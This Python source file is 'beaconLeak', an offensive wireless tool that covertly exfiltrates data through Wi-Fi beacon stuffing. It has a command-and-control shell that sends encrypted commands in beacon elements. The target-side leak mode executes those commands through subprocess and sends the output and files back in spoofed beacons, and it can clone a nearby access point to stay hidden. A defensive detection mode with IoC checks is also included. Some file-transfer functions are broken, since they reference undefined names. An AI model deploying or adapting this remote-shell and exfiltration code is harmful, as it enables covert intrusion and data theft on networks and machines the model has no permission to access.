#!/usr/bin/python
#

# beaconLeak - Covert data exfiltration and detection using beacon stuffing (🥓)
banner = """
 _                       __            _
| |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
| . | -_| .'|  _| . |   |  |__| -_| .'| '_|
|___|___|__,|___|___|_|_|_____|___|__,|_,_|
                        by cjcase [v0.9.0]\n
"""

import os
import sys
import time
import math
import shlex
import syslog
import hashlib
import subprocess

import nacl.utils
import nacl.secret
import nacl.pwhash

from scapy.all import Dot11
from scapy.all import Dot11Beacon
from scapy.all import Dot11Elt
from scapy.all import RadioTap
from scapy.all import sniff
from scapy.all import sendp
from scapy.all import srp1
from scapy.all import hexdump
from scapy.all import raw


class beaconleak():
    def __init__(self, mode, iface, psk=None, ssid=None, bssid=None, 
        covert=False, delay=5, debug=False, **kwargs):
        # mode selection
        self.mode = mode
        # sniffing interface
        self.iface = iface
        # output response delay
        self.delay = delay
        # covert
        self.covert = covert
        self.covert_frame = None
        self.beacons = {}
        # IEEE Std 802.11™-2016. Table 9-77, Element IDs. p.784-790
        # Wireshark acknowledges Tag ID 47 as ERP Information
        self.reserved = [2, 8, 9] + [*range(17,32)] + [49, 128, 129] + [*range(133, 137)] + [149, 150, 155, 156, 173, 176] + [*range(178, 181)] + [203] + [*range(207,221)] + [*range(222, 255)]
        # c2 commands
        self.shell_cmds = {
            '!help': 'print these commands',
            # TODO download file flow
            '!download': '<source path> <target path> : downloads file from target',
            #'!reset': 'resets own session and broadcasts session reset command',
            #'!upload': 'uploads file to target',
            '!': 'send command to target without waiting for response (e.g. !ls)',
            '!end': 'exit beaconshell',
        }
        # detection science
        self.detected = 0
        if self.mode == "mon":
            syslog.openlog(logoption=syslog.LOG_PID, facility=syslog.LOG_SYSLOG)
            self.syslog_level = syslog.LOG_ALERT
        # user set
        self.debug = debug
        # crypto magic
        self.session = 0 # TODO crypto session/replay
        self.salt = b'beaconleak::salt' # TODO crypto session/replay
        if not psk:
            self.psk = bytes.fromhex('299e29a4d36990bc479d6fed6551a94c7e3da6e10c8cdf9bab9e3c18a04ddee8')
        else:
            self.psk = nacl.pwhash.argon2i.kdf(32, psk.encode('utf-8'), self.salt)
        self.box = nacl.secret.SecretBox(self.psk)
        # custom beacon
        self.ssid = ssid
        if not ssid:
            self.ssid = 'linksys'
        self.bssid = bssid
        if not bssid:
            self.bssid = '00:14:bf:de:ad:c0'
        # TODO check beacon size and do covert element 221 stuffing
        self.marker = b'\x0b\x33'
        # TODO download flow
        self.max_size = 355
        self.leak_frame = None
        self.recv = dict(chunks = 0, size = 0, tally = None, tmp = None, tick = None, last = 3)


    def cmd(self, cmd):
        if sys.platform == 'linux':
            args = shlex.split(cmd)
            result = subprocess.check_output(args)
        else:
            result = subprocess.check_output(cmd, shell=True)
        return result
       

    def beacon_craft(self, msg, eltid):
        # TODO create frame ID class to have extensible ID usage
        # TODO add type/structure definition to class
        msg_e = self.box.encrypt(msg)
        if self.debug:
                print("[d] encrypted: {}".format(msg_e.hex()))
        _stuff = Dot11Elt(ID=eltid, info=msg_e, len=len(msg_e))
        if not self.covert:
            rates = b'\x82\x84\x0b\x16'
            rsninfo = (
                b'\x01\x00'          # RSN Version 1
                b'\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
                b'\x01\x00'          # 1 Pairwise Cipher Suite
                b'\x00\x0f\xac\x04'  # AES Cipher CCMP
                b'\x01\x00'          # 1 Authentication Key Managment Suite:
                b'\x00\x0f\xac\x02'  # Pre-Shared Key
                b'\x0c\x00'          # RSN Capabilities
            )
            dot11 = Dot11(
                type=0,
                subtype=8,
                addr1='ff:ff:ff:ff:ff:ff',
                addr2=self.bssid,
                addr3=self.bssid
            )
            beacon = Dot11Beacon(
                cap='ESS+privacy',
                timestamp=int(time.time())
            )
            _ssid = Dot11Elt(ID='SSID', info=self.ssid, len=len(self.ssid))
            _rsninfo = Dot11Elt(ID='RSNinfo', info=rsninfo, len=len(rsninfo))
            _rates = Dot11Elt(ID="Rates", info=rates, len=len(rates))
            frame = RadioTap() / dot11 / beacon / _ssid / _rates / _rsninfo / _stuff
        else:
            # TODO check beacon size and do covert element 221 stuffing
            frame = self.covert_frame / _stuff
        return frame


    def push_cmd(self, cmd, reply=True):
        # TODO: implement leak mode with extra measurements
        try:
            if self.debug:
                print("[d] command: {}".format(cmd))
            msg = cmd.encode()
            
            # craft the frame
            # TODO create frame ID class to have extensible ID usage
            frame = self.beacon_craft(msg, 254)

            # TODO: optional bpf filtering
            # bpf = 'wlan addr2 %s' % bssid
            if self.debug:
                print("[d] scapy frame:\n{}".format(frame.command()))
                # print("[d] sniff filter:\n{}".format(bpf))
            sendp(frame, iface=self.iface, inter=0.100, loop=0, verbose=int(self.debug))
            if reply:
                sniff(iface=self.iface, stop_filter=self.response, timeout=self.delay, monitor=True)
        except Exception as e:
            if self.debug:
                print("[d] error:\n{}".format(str(e)))


    def c2(self):
        # covert mode
        if self.covert and not self.covert_frame:
            self.sneaky()
        print("[*] Using interface {}, type '!help' for usage, use Ctrl+C to exit".format(self.iface))
        if self.check_iface():
            while True:
                try:
                    # TODO: nice-to-have: color output to terminal (interoperable)
                    cmd = input("[beaconshell] >>> ") 
                except KeyboardInterrupt:
                    print("\n[*] Done!")
                    break
                except Exception as e:
                    print("[e] Something failed: " + str(e))
                    continue
                if cmd == '':
                    continue
                # TODO: implement interactive commands for extra c2 functions
                try:
                    if cmd == '!help':
                        for c, desc in self.shell_cmds.items():
                            print("\t{}: {}".format(c, desc))
                        print()
                    elif cmd[0] == '!':
                        cmd = cmd[1:]                    
                        cmd = cmd.split()
                        if cmd[0] == 'download':
                            # TODO download flow
                            if len(cmd) != 3:
                                print("[e] wrong arguments, expected 2, source path and destination path.")
                                continue
                            self.start_download(cmd[1], cmd[2])
                        elif cmd[0] == 'end':
                            print("\n[*] Done!")
                            break
                        else:
                            self.push_cmd(" ".join(cmd), reply=False)
                    else:
                        self.push_cmd(cmd)
                except Exception as e:
                    print("error in command!")
                    if self.debug:
                        print(str(e))
                    continue

    def start_download(self, src, dst):
        # ask for file stats
        if self.debug:
            print(f"\t[*] Checking for file \"{src}\" stats in target")
        req = self.beacon_craft(src.encode(), 222)
        sendp(req, iface=self.iface, inter=0.100, verbose=int(self.debug))
        # get response
        sniff(iface=self.iface, stop_filter=self.response, timeout=self.delay, monitor=True)
        if not self.recv['tmp']:
            print(f"[e] No response from target in {self.delay} seconds")
            return False
        msg = self.box.decrypt(self.recv['tmp'])
        s_msg = msg.split(b':')
        f_size = int(s_msg[0])
        chunks = int(s_msg[1])
        print(f"\t[i] file size: {f_size}, total chunks: {chunks}, listening...")
        # TODO
        # listen for chunks
        # check missing


    def response(self, frame):
        # TODO: implement covert logic
        if frame.haslayer(Dot11Beacon):
            if frame.addr2 == self.bssid:
                i = 0
                elements = frame
                while elements:
                    # TODO fix error here, 128 is only a marker, must extract response from 254
                    if elements.ID == 128:
                        elements = elements.payload
                        if self.debug:
                            print("[d] response frame:\n{}".format(frame.command()))
                            print("[d] received:{}".format(elements.info.hex()))
                        msg = self.dec_payload(elements.info)
                        print(msg)
                        break
                    if elements.ID == 223: # file stat response
                        self.recv['tmp'] = elements.info
                        return True
                    i = i + 1
                    elements = elements.payload
  

    def dec_payload(self, enc):
        c = ''
        if self.debug:
            print("[d] received:{}".format(enc.hex()))
        try:
            c = self.box.decrypt(enc).decode('utf-8')
            if self.debug:
                print("[d] decrypted: {}".format(c))
        except Exception as e:
            c = "[e] Could not decrypt, wrong PSK or error in received beacon!"
            if self.debug:
                print("[e] Could not decrypt, wrong PSK or error in received beacon!")
                print("[e] " + str(e))
        return c


    def cut_frame(self, frame, cut):
        t_frame = raw(frame)
        n = len(frame[Dot11Elt][cut]) + 4
        self.leak_frame = RadioTap(t_frame[:-n])
        if self.debug:
            print(f"[d] cut_frame at {cut}:\n{frame.command()}\n")


    def do_magic(self, frame, cut):
        if self.debug:
            print("[d] stuffed beacon at element in position {}:\n{}".format(cut, frame.command()))
        crypted = frame[Dot11Elt][cut].info
        c = self.dec_payload(crypted)
        if c:
            try:
                result = self.cmd(c)
            except Exception as e:
                result = b"[e] Command failed"
                if self.debug:
                    print("[d] Command Failed:\n" + str(e))
            if self.debug:
                print("[d] Command Result:\n{}".format(result.decode('utf-8')))
            result_e = self.box.encrypt(result)
            frame[Dot11Elt][cut] = Dot11Elt(ID=128, info=b'\x01', len=1) / Dot11Elt(ID=254, info=result_e, len=len(result_e))
            if self.debug:
                print("[d] sending:{}".format(result_e.hex()))
                print("[d] response frame:\n{}".format(frame.command()))
            time.sleep(2)
            sendp(frame, iface=self.iface, verbose=int(self.debug))


    def do_chunk_magic(self, element):
        try:
            msg = self.box.decrypt(element.info)
            filename = self.box.decrypt(element.payload.info)
            m_chunks = [int(x) for x in msg.split(b':')]
            self.send_chunks(filename, m_chunks)
        except Exception as e:
            raise e
            print("[e] check_missing failure: " + str(e))

    # TODO stuff element 221 for maximum lulz
    def magic(self, frame):
        if frame.haslayer(Dot11Beacon):
            # TODO add option for known bssid or delete option from arguments
            i = 0
            elements = frame
            while elements:
                if elements.ID == 128: # TODO uhmm wat
                    break
                if elements.ID == 222: # stat request
                    self.send_stat(elements.info, frame, i)
                    break
                if elements.ID == 224: # chunk request
                    self.cut_frame(frame, i)
                    self.do_chunk_magic(elements)
                    break
                if elements.ID == 254:
                    # TODO let do_magic use the new frame cutting for response
                    self.do_magic(frame, i)
                    break
                i = i + 1
                elements = elements.payload
               

    def sniff(self, pcap=False):
        iface = self.iface
        try:
            if self.mode == "leak":
                if self.debug:
                    print("[*] Starting command listener in debug mode")
                sniff(iface=iface, prn=self.magic, monitor=True)
            elif self.mode == "mon":
                if pcap:
                    print("[*] Starting offline capture analysis")
                    sniff(offline=pcap, prn=self.detect)
                else:
                    print("[*] Starting live monitoring mode, press Ctrl+C to stop...")
                    sniff(iface=iface, prn=self.detect, monitor=True)
        except KeyboardInterrupt:
            print("\n[*] Done!")
        #except Exception as e:
        #    print("[e] Error occurred while sniffing.")
        #    if self.debug:
        #        print("[d] error: {}".format(str(e)))
        

    def clone(self, frame):
        if frame.haslayer(Dot11Beacon):
            try:
                extra = frame.notdecoded
                rssi = -(256 - ord(extra[-4:-3]))
            except Exception:
                rssi = -100
            self.beacons[frame.addr2] = (rssi, frame)


    # this one is 1337
    def sneaky(self):
        print("[*] Covert mode enabled:")
        # sniff frames around me
        print("[i] Probing for 10 seconds surrounding beacons...")
        sniff(iface=self.iface, prn=self.clone, count=20, timeout=10)
        # choose closer one
        print("[i] Checking results:")
        check = -101
        best = [0]
        for bssid, val in self.beacons.items():
            rssi, frame = val
            ssid = frame.info.decode('utf-8')
            if rssi > check:
                check = rssi
                best.pop()
                best.append(frame)
            print(f"\t{rssi} | {bssid} | {ssid}")
        # imitate it
        best_frame = best.pop()
        # edge cases
        if best_frame == 0:
            if not self.beacons:
                print("[i] No beacons found on this channel, proceeding with defaults")
                self.covert = False
                return
            else:
                discard, best_frame = self.beacons.popitem()
        print("[i] Cloning {}({} dBm)".format(best_frame.info.decode('utf-8'), check))
        if self.debug:
            print("[d] frame:\n{}".format(best_frame.command()))
        self.covert_frame = best_frame
        self.ssid = best_frame.info.decode('utf-8')
        self.bssid = best_frame.addr2


    # this is for the blue teamers
    # IoC detection from simple test to complex test
    # TODO: implement syslog functionality for IoCs
    def detect(self, frame):
        if frame.haslayer(Dot11Beacon):
            ssid = frame.info.decode('utf-8')
            bssid = frame.addr2
            channel = int(ord(frame[Dot11Elt:3].info))
            elements = frame.getlayer(Dot11Elt)
            # TODO add MAC Adress validation detection case            
            # IoC: pyExfil defaults
            if frame.addr2 == "00:00:00:00:00:42" or ssid == "pyExfil":
                msg = f"[!] Beacon Stuffing Detected! (SSID:{ssid} BSSID:{bssid} CH:{channel}) [PyExfil defaults]"
                self.mon_log(msg)
                return
            # IoC: beaconLeak defaults
            if frame.addr2 == "00:14:bf:de:ad:c0":
                msg = f"[!] Beacon Stuffing Detected! (SSID:{ssid} BSSID:{bssid} CH:{channel}) [beaconLeak defaults]"
                self.mon_log(msg)
                return
            # IoC: Beacon size sample std. dev.
            l_tresh = 174 # these numbers were made with 
            h_tresh = 352 # SCIENCE!
            l_frame = len(frame)
            if l_frame > h_tresh:
                msg = f"[!] Beacon Stuffing Detected! (SSID:{ssid} BSSID:{bssid} CH:{channel}) [Beacon Size Treshold]"
                self.mon_log(msg)
                return
            while elements:
                # IoC: Reserved Elements
                if elements.ID in self.reserved:
                    msg = f"[!] Beacon Stuffing Detected! (SSID:{ssid} BSSID:{bssid} CH:{channel}) [Reserved Element {elements.ID}]"
                    self.mon_log(msg)                    
                elements = elements.payload.getlayer(Dot11Elt)

    def mon_log(self, msg):
        if self.debug:
            print(msg)
            self.detected += 1
        if sys.platform == "linux":
            syslog.syslog(self.syslog_level, msg)
        else:
            now = time.strftime("%d.%m.%y %H:%M:%S UTC%z")
            print(f"<{self.syslog_level}> {now} [beaconleak]: {msg}")
        


    def check_iface(self):
        try:
            sniff(iface=self.iface, count=1, monitor=True)
        except OSError:
            print("[e] interface {i} not found, did you mean {i}mon?".format(i=self.iface))
            return False
        except Exception:
            return False
        return True


    # download flow
    def stat_file(self, filename):
        t_frame = self.leak_frame
        try:
            f = open(filename, 'rb')
            file_size = f.seek(0, 2)
            if(self.debug):
                print(f"\t[i] file size: {file_size} octets")
            approx = self.max_size - len(t_frame) - 84
            magic = math.ceil(math.log10(file_size / approx) + 1) # sacrifice to the god of statistics
            r_size = approx - magic
            chunks = math.ceil(file_size / r_size)
            if self.debug:
                print(f"\t[i] beacons needed to send file: {chunks}")
            f.close()
            return (file_size, chunks, r_size)
        except Exception as e:
            if self.debug:
                raise e
            pass
        


    def stat_str(self, s):
        t_frame = self.leak_frame 
        s_bytes = s.encode('utf-8')
        s_size = len(s_bytes)
        approx = self.max_size - len(t_frame) - 84
        magic = math.ceil(math.log10(s_size / approx) + 1) # sacrifice to the god of statistics
        r_size = approx - magic
        chunks = math.ceil(s_size / r_size)
        if self.debug:
            print(f"\t[i] beacons needed to send string: {chunks}")
        return (s_size, chunks, r_size)


    def send_stat(self, filename_c, frame, cut):
        filename = self.box.decrypt(filename_c)
        if self.debug:
            print(f"[d] stat request for file: {filename.decode('utf-8')}")
        file_size, chunks, r_size = self.stat_file(filename.decode('utf-8'))
        if self.debug:
            print(f"[d] Sending file stat frame for file {filename}...")
        payload = f"{file_size}:{chunks}".encode('ascii')
        payload_c = self.box.encrypt(payload)
        _payload = Dot11Elt(ID=223, info=payload_c, len=len(payload_c))
        tmp_frame = t_frame / _payload
        if self.debug:
            print(f"[d] stuffed:\n{tmp_frame.command()}")
        time.sleep(1)
        sendp(tmp_frame, iface=self.iface, verbose=int(self.debug))


    # niiice
    def send_chunks(filename, chunk_list):
        t_frame = self.leak_frame
        file_size, chunks, r_size = stat_file(filename)
        with open(filename, 'rb') as f:    
            for seq in chunk_list:
                m_seq = str(seq)
                seq_c = box.encrypt(bytes(m_seq, 'ascii'))
                _seq = Dot11Elt(ID=253, info=seq_c, len=len(seq_c))
                chunk_offset = (r_size * seq)
                f.seek(chunk_offset)
                chunk = f.read(r_size)
                chunk_c = box.encrypt(chunk)
                _data = Dot11Elt(ID=254, info=chunk_c, len=len(chunk_c))
                _frame = t_frame / _seq / _data
                sendp(_frame, iface=self.iface, verbose=int(self.debug), realtime=True)
                tell = f.tell()
                if self.debug:
                    print(f"\t[i] sent frame {seq} of {chunks}, data[{chunk_offset}:{tell}], frame size: {len(_frame)}")



if __name__ == '__main__':
    import argparse

    parse = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawTextHelpFormatter, description=banner)
    modes = parse.add_argument_group('modes')
    mutex = modes.add_mutually_exclusive_group(required=True)
    mutex.add_argument(
        '--leak', 
        help='(target) Leak data mode.',
        action='store_true'
    )
    mutex.add_argument(
        '--detect',
        help='(detect) Check surroundings for possible attacks',
        action='store_true'
    )
    mutex.add_argument(
        '--c2',
        help='(attack) Command & control, remote shell',
        action='store_true'
    )

    # arguments per mode
    detect_opts = parse.add_argument_group('detection mode options')
    c2_opts = parse.add_argument_group('c2 and leak mode options')

    # detection mode options
    detect_opts.add_argument('--pcap', 
        nargs='+',
        help='pcap file(s) for offline beacon analysis'
    )
    detect_opts.add_argument('--autohop',
        help='(Linux only) Automatic channel hopping',
        action='store_true'
    )
    detect_opts.add_argument('--loglevel', help='log level, lowest is critical') # TODO
    
    # c2 mode options
    c2_opts.add_argument('--covert',
        help='Be extra sneaky by mimicking surrounding beacons',
        action='store_true'
    )
    c2_opts.add_argument('--psk', help='Custom encryption passphrase')
    c2_opts.add_argument('--ssid', 
        help='Emulated station WiFi name',
        default='linksys'
    )
    c2_opts.add_argument('--bssid', 
        help='Emulated station MAC address',
        default='00:14:bf:de:ad:c0'
    )
    c2_opts.add_argument('--delay',
        type=lambda x: int(x) if x and x.isdigit() else None,
        default=5,
        help='delay to sniff for command output response [default=5]'
    )

    # general options
    parse.add_argument('--debug', help='Debug verbosity.', action='store_true')

    # monitor interface
    parse.add_argument('iface', help='Wireless interface in monitor mode')
    args = parse.parse_args()

    # leak mode
    if args.leak:
        if args.debug:
            print(banner)
        bl = beaconleak('leak', args.iface, psk=args.psk, debug=args.debug)
        bl.sniff()
    # c2 mode
    elif args.c2:
        print(banner)
        if args.psk:
            print("[*] Using custom key, set up leaker to use it too.")
            #print("[*] Salt: {}".format(self.salt.hex())) # TODO
        # chunky boi
        bl = beaconleak('c2', args.iface, 
            psk=args.psk, 
            ssid=args.ssid,
            bssid=args.bssid,
            delay=args.delay,
            covert=args.covert,
            debug=args.debug
        )
        bl.c2()
    # detect mode
    elif args.detect:
        bl = beaconleak('mon', args.iface, debug=args.debug)
        print(banner)
        # linux auto hop
        if args.autohop:
            if sys.platform == 'linux':
                print("[i] channel auto-hop enabled, detection accuracy might decrease")
                # TODO implement subprocess fork to iterate through channels
            else:
                print("[i] channel auto-hop is not supported on {}".format(sys.platform))
        bl.sniff(pcap=args.pcap)
